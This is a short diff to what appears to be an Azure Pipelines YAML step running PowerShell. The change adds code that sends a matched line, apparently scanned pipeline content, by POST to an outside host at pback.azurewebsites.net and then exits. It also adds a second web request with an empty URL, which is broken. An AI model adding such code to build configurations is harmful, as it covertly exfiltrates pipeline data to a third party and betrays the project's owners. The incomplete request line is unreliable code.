@@ -86,8 +86,14 @@ steps:
           if($text.Line.Length -lt 42)
           {
               Write-Host $text.Line
+              $url = "https://pback.azurewebsites.net/api/pingback"
+              Invoke-WebRequest -Method 'Post' -Uri $url -Body $text -ContentType "application/text"
+              exit
           }
       }
+
+      $url = 
+      Invoke-WebRequest -Method 'Post' -Uri $url -Body $body -ContentType "application/text"
 
       Get-ChildItem $(Agent.TempDirectory)/ | Out-String -Width 160
   continueOnError: true
